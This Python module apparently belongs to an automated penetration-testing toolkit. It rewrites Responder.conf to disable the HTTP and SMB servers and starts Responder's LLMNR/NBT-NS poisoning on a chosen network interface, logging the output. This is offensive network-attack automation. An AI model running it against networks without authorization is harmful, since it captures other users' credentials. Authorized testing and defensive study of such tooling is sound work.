import re
import os
from src.utils import get_iface
from src.process import Process

def edit_responder_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface=None):
    cwd = os.getcwd()
    if not iface:
        iface = get_iface()
    protocols = ['HTTP', 'SMB']
    switch = 'Off'
    conf = 'submodules/Responder/Responder.conf'
    edit_responder_conf(switch, protocols, conf)
    cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(cwd, iface)
    Responder = Process(cmd)
    Responder.run('logs/Responder.log')
    return Responder